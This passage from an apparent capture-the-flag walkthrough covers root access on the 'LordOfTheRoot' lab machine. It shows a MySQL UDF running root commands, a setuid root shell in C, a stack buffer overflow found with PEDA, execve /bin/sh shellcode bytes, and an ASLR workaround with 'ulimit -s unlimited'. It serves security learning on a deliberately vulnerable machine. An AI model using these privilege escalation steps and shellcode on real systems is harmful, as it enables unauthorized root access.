</span><span class='line'>| do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out') |
</span><span class='line'>+------------------------------------------------------------+
</span><span class='line'>|                                                          0 |
</span><span class='line'>+------------------------------------------------------------+
</span><span class='line'>1 row in set (0.01 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; \! cat /tmp/out
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>


<p>Note that you can use <em>\!</em> to run commands from within the MySQL shell.</p>

<ul>
<li>Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used MySQL to compile it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
</span><span class='line'>+-----------------------------------------------------+
</span><span class='line'>| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
</span><span class='line'>+-----------------------------------------------------+
</span><span class='line'>|                                                   0 |
</span><span class='line'>+-----------------------------------------------------+
</span><span class='line'>1 row in set (0.15 sec)</span></code></pre></td></tr></table></div></figure>


<p>Now set the SUID bit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system("chmod u+s /tmp/ring");
</span><span class='line'>+----------------------------------+
</span><span class='line'>| do_system("chmod u+s /tmp/ring") |
</span><span class='line'>+----------------------------------+
</span><span class='line'>|                                0 |
</span><span class='line'>+----------------------------------+
</span><span class='line'>1 row in set (0.01 sec)</span></code></pre></td></tr></table></div></figure>


<p>I looked inside /tmp for confirmation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ ls -l /tmp/
</span><span class='line'>total 12
</span><span class='line'>-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
</span><span class='line'>-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring</span></code></pre></td></tr></table></div></figure>


<p>Lastly, I dropped to a shell with <code>\! sh</code>, and ran the newly created binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ /tmp/ring
</span><span class='line'>root@LordOfTheRoot:~# cat /root/Flag.txt 
</span><span class='line'>“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
</span><span class='line'>– Gandalf</span></code></pre></td></tr></table></div></figure>


<p>Inside root&rsquo;s directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..</p>

<h2>Privilege escalation method #2 &ndash; Binary exploitation</h2>

<p>So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/SECRET$ ls -la *
</span><span class='line'>door1:
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
</span><span class='line'>
</span><span class='line'>door2:
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
</span><span class='line'>-rwsr-xr-x 1 root root 5150 Sep 22  2015 file
</span><span class='line'>
</span><span class='line'>door3:
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7370 Sep 17  2015 file</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see each of them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>door1/file 
</span><span class='line'>Syntax: door1/file &lt;input string&gt;</span></code></pre></td></tr></table></div></figure>


<p>I went through them, and determined that the vulnerable binary is the one with size 5150.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./file $(python -c 'print "A" * 200')
</span><span class='line'>Segmentation fault (core dumped)</span></code></pre></td></tr></table></div></figure>


<p>I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it&rsquo;s GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or <a href="https://github.com/longld/peda">Python Exploit Development Assistance for GDB</a>, which adds cool features and colorizes the display. So I figured I&rsquo;d give it a try, and downloaded it to the target and installed it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git clone https://github.com/longld/peda.git ~/peda
</span><span class='line'>echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit</span></code></pre></td></tr></table></div></figure>


<p>If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help
</span><span class='line'>PEDA - Python Exploit Development Assistance for GDB
</span><span class='line'>For latest update, check peda project page: https://github.com/longld/peda/
</span><span class='line'>List of "peda" subcommands, type the subcommand to invoke it:
</span><span class='line'>aslr -- Show/set ASLR setting of GDB
</span><span class='line'>asmsearch -- Search for ASM instructions in memory
</span><span class='line'>assemble -- On the fly assemble and execute instructions using NASM
</span><span class='line'>checksec -- Check for various security options of binary
</span><span class='line'>cmpmem -- Compare content of a memory region with a file
</span><span class='line'>context -- Display various information of current execution context
</span><span class='line'>context_code -- Display nearby disassembly at $PC of current execution context
</span><span class='line'>context_register -- Display register information of current execution context
</span><span class='line'>context_stack -- Display stack of current execution context
</span><span class='line'>crashdump -- Display crashdump info and save to file
</span><span class='line'>deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
</span><span class='line'>distance -- Calculate distance between two addresses
</span><span class='line'>dumpargs -- Display arguments passed to a function when stopped at a call instruction
</span><span class='line'>dumpmem -- Dump content of a memory region to raw binary file
</span><span class='line'>dumprop -- Dump all ROP gadgets in specific memory range
</span><span class='line'>eflags -- Display/set/clear/toggle value of eflags register
</span><span class='line'>elfheader -- Get headers information from debugged ELF file
</span><span class='line'>elfsymbol -- Get non-debugging symbol information from an ELF file
</span><span class='line'>gennop -- Generate abitrary length NOP sled using given characters
</span><span class='line'>getfile -- Get exec filename of current debugged process
</span><span class='line'>getpid -- Get PID of current debugged process
</span><span class='line'>goto -- Continue execution at an address
</span><span class='line'>help -- Print the usage manual for PEDA commands
</span><span class='line'>hexdump -- Display hex/ascii dump of data in memory
</span><span class='line'>hexprint -- Display hexified of data in memory
</span><span class='line'>jmpcall -- Search for JMP/CALL instructions in memory
</span><span class='line'>loadmem -- Load contents of a raw binary file to memory
</span><span class='line'>lookup -- Search for all addresses/references to addresses which belong to a memory range
</span><span class='line'>nearpc -- Disassemble instructions nearby current PC or given address
</span><span class='line'>nextcall -- Step until next 'call' instruction in specific memory range
</span><span class='line'>nextjmp -- Step until next 'j*' instruction in specific memory range
</span><span class='line'>nxtest -- Perform real NX test to see if it is enabled/supported by OS
</span><span class='line'>patch -- Patch memory start at an address with string/hexstring/int
</span><span class='line'>pattern -- Generate, search, or write a cyclic pattern to memory
</span><span class='line'>pattern_arg -- Set argument list with cyclic pattern
</span><span class='line'>pattern_create -- Generate a cyclic pattern
</span><span class='line'>pattern_env -- Set environment variable with a cyclic pattern
</span><span class='line'>pattern_offset -- Search for offset of a value in cyclic pattern
</span><span class='line'>pattern_patch -- Write a cyclic pattern to memory
</span><span class='line'>pattern_search -- Search a cyclic pattern in registers and memory
</span><span class='line'>payload -- Generate various type of ROP payload using ret2plt
</span><span class='line'>pdisass -- Format output of gdb disassemble command with colors
</span><span class='line'>pltbreak -- Set breakpoint at PLT functions match name regex
</span><span class='line'>procinfo -- Display various info from /proc/pid/
</span><span class='line'>profile -- Simple profiling to count executed instructions in the program
</span><span class='line'>pyhelp -- Wrapper for python built-in help
</span><span class='line'>readelf -- Get headers information from an ELF file
</span><span class='line'>refsearch -- Search for all references to a value in memory ranges
</span><span class='line'>reload -- Reload PEDA sources, keep current options untouch
</span><span class='line'>ropgadget -- Get common ROP gadgets of binary or library
</span><span class='line'>ropsearch -- Search for ROP gadgets in memory
</span><span class='line'>searchmem -- Search for a pattern in memory; support regex search
</span><span class='line'>session -- Save/restore a working gdb session to file as a script
</span><span class='line'>set -- Set various PEDA options and other settings
</span><span class='line'>sgrep -- Search for full strings contain the given pattern
</span><span class='line'>shellcode -- Generate or download common shellcodes.
</span><span class='line'>show -- Show various PEDA options and other settings
</span><span class='line'>skeleton -- Generate python exploit code template
</span><span class='line'>skipi -- Skip execution of next count instructions
</span><span class='line'>snapshot -- Save/restore process's snapshot to/from file
</span><span class='line'>start -- Start debugged program and stop at most convenient entry
</span><span class='line'>stepuntil -- Step until a desired instruction in specific memory range
</span><span class='line'>strings -- Display printable strings in memory
</span><span class='line'>substr -- Search for substrings of a given string/number in memory
</span><span class='line'>telescope -- Display memory content at an address with smart dereferences
</span><span class='line'>tracecall -- Trace function calls made by the program
</span><span class='line'>traceinst -- Trace specific instructions executed by the program
</span><span class='line'>unptrace -- Disable anti-ptrace detection
</span><span class='line'>utils -- Miscelaneous utilities from utils module
</span><span class='line'>vmmap -- Get virtual mapping address ranges of section(s) in debugged process
</span><span class='line'>waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
</span><span class='line'>xinfo -- Display detail information of address/registers
</span><span class='line'>xormem -- XOR a memory region with a key
</span><span class='line'>xprint -- Extra support to GDB's print command
</span><span class='line'>xrefs -- Search for all call/data access references to a function/variable
</span><span class='line'>xuntil -- Continue execution until an address or function
</span><span class='line'>
</span><span class='line'>Type "help" followed by subcommand for full documentation.</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help pattern
</span><span class='line'>Generate, search, or write a cyclic pattern to memory
</span><span class='line'>Set "pattern" option for basic/extended pattern type
</span><span class='line'>Usage:
</span><span class='line'>    pattern create size [file]
</span><span class='line'>    pattern offset value
</span><span class='line'>    pattern search
</span><span class='line'>    pattern patch address size
</span><span class='line'>    pattern arg size1 [size2,offset2]
</span><span class='line'>    pattern env size[,offset]
</span><span class='line'>gdb-peda$ pattern create 200 test
</span><span class='line'>Writing pattern of 200 chars to filename "test"</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/peda.png" title="peda" alt="segfault in peda"></p>

<p>I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ pattern search 0x57414174
</span><span class='line'>Registers contain pattern buffer:
</span><span class='line'>EBP+0 found at offset: 167
</span><span class='line'>EIP+0 found at offset: 171
</span><span class='line'>Registers point to pattern buffer:
</span><span class='line'>[ESP] --&gt; offset 175 - size ~25
</span><span class='line'>Pattern buffer found at:
</span><span class='line'>0xbffff571 : offset    0 - size  200 ($sp + -0xaf [-44 dwords])
</span><span class='line'>0xbffff7f8 : offset    0 - size  200 ($sp + 0x1d8 [118 dwords])
</span><span class='line'>References to pattern buffer found at:
</span><span class='line'>0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
</span><span class='line'>0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
</span><span class='line'>0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
</span><span class='line'>0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])</span></code></pre></td></tr></table></div></figure>


<p>The reported offset is 171. Verified it really quick:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
</span><span class='line'>[...]
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbffff640 ("CCCC")
</span><span class='line'>EIP: 0x42424242 ('BBBB')</span></code></pre></td></tr></table></div></figure>


<p>Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help shellcode
</span><span class='line'>Generate or download common shellcodes.
</span><span class='line'>Usage:
</span><span class='line'>    shellcode generate [arch/]platform type [port] [host]
</span><span class='line'>    shellcode search keyword (use % for any character wildcard)
</span><span class='line'>    shellcode display shellcodeId (shellcodeId as appears in search results)
</span><span class='line'>    shellcode zsc [generate customize shellcode]
</span><span class='line'>
</span><span class='line'>    For generate option:
</span><span class='line'>        default port for bindport shellcode: 16706 (0x4142)
</span><span class='line'>        default host/port for connect back shellcode: 127.127.127.127/16706
</span><span class='line'>        supported arch: x86</span></code></pre></td></tr></table></div></figure>


<p>Next I searched for some execve shellcode, and settled for the below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[841]    Linux/x86 - Tiny Execve sh Shellcode - 21 bytes</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what I got here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ shellcode display 841
</span><span class='line'>Connecting to shell-storm.org...
</span><span class='line'>
</span><span class='line'>/*
</span><span class='line'>
</span><span class='line'> Tiny Execve sh Shellcode - C Language - Linux/x86
</span><span class='line'> Copyright (C) 2013 Geyslan G. Bem, Hacking bits
</span><span class='line'>
</span><span class='line'>   http://hackingbits.com
</span><span class='line'>   geyslan@gmail.com
</span><span class='line'>
</span><span class='line'> This program is free software: you can redistribute it and/or modify
</span><span class='line'> it under the terms of the GNU General Public License as published by
</span><span class='line'> the Free Software Foundation, either version 3 of the License, or
</span><span class='line'> (at your option) any later version.
</span><span class='line'>
</span><span class='line'> This program is distributed in the hope that it will be useful,
</span><span class='line'> but WITHOUT ANY WARRANTY; without even the implied warranty of
</span><span class='line'> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
</span><span class='line'> GNU General Public License for more details.
</span><span class='line'>
</span><span class='line'> You should have received a copy of the GNU General Public License
</span><span class='line'> along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;
</span><span class='line'>
</span><span class='line'>*/
</span><span class='line'>
</span><span class='line'>/*
</span><span class='line'>
</span><span class='line'>   tiny_execve_sh_shellcode
</span><span class='line'>
</span><span class='line'>  * 21 bytes
</span><span class='line'>  * null-free
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode
</span><span class='line'>
</span><span class='line'>   Testing
</span><span class='line'>   # ./tiny_execve_sh_shellcode
</span><span class='line'>
</span><span class='line'>*/
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>unsigned char shellcode[] = \
</span><span class='line'>
</span><span class='line'>"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
</span><span class='line'>"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
</span><span class='line'>"\x80";
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>main ()
</span><span class='line'>{
</span><span class='line'>
</span><span class='line'>        // When contains null bytes, printf will show a wrong shellcode length.
</span><span class='line'>
</span><span class='line'>  printf("Shellcode Length:  %d\n", strlen(shellcode));
</span><span class='line'>
</span><span class='line'>  // Pollutes all registers ensuring that the shellcode runs in any circumstance.
</span><span class='line'>
</span><span class='line'>  __asm__ ("movl $0xffffffff, %eax\n\t"
</span><span class='line'>       "movl %eax, %ebx\n\t"
</span><span class='line'>       "movl %eax, %ecx\n\t"
</span><span class='line'>       "movl %eax, %edx\n\t"
</span><span class='line'>       "movl %eax, %esi\n\t"
</span><span class='line'>       "movl %eax, %edi\n\t"
</span><span class='line'>       "movl %eax, %ebp\n\t"
</span><span class='line'>
</span><span class='line'>       // Calling the shellcode
</span><span class='line'>       "call shellcode");
</span><span class='line'>
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ context stack
</span><span class='line'>
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff640 ("CCCC")
</span><span class='line'>0004| 0xbffff644 --&gt; 0xbffff600 ('A' &lt;repeats 60 times&gt;, "BBBBCCCC")
</span><span class='line'>0008| 0xbffff648 --&gt; 0xbffff6e0 --&gt; 0xbffff8c1 ("XDG_SESSION_ID=1")
</span><span class='line'>0012| 0xbffff64c --&gt; 0xb7feccea (&lt;call_init+26&gt;: add    ebx,0x12316)
</span><span class='line'>0016| 0xbffff650 --&gt; 0x2 
</span><span class='line'>0020| 0xbffff654 --&gt; 0xbffff6d4 --&gt; 0xbffff803 ("/tmp/file")
</span><span class='line'>0024| 0xbffff658 --&gt; 0xbffff674 --&gt; 0x658f7063 
</span><span class='line'>0028| 0xbffff65c --&gt; 0x804974c --&gt; 0xb7e2f990 (&lt;__libc_start_main&gt;:   push   ebp)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV</span></code></pre></td></tr></table></div></figure>


<p>So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn&rsquo;t expect something like ASLR to be enabled, but when I checked, it actually is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>I checked with <em>ldd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0xb773d000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
</span><span class='line'>  /lib/ld-linux.so.2 (0xb773f000)
</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0xb770c000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
</span><span class='line'>  /lib/ld-linux.so.2 (0xb770e000)</span></code></pre></td></tr></table></div></figure>


<p>After some googling, I found a <a href="https://www.exploit-db.com/exploits/39669/">trick to disable ASLR</a>. On a vulnerable 32 bit system, ASLR doesn&rsquo;t always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0x40024000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
</span><span class='line'>  /lib/ld-linux.so.2 (0x40000000)
</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0x40024000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
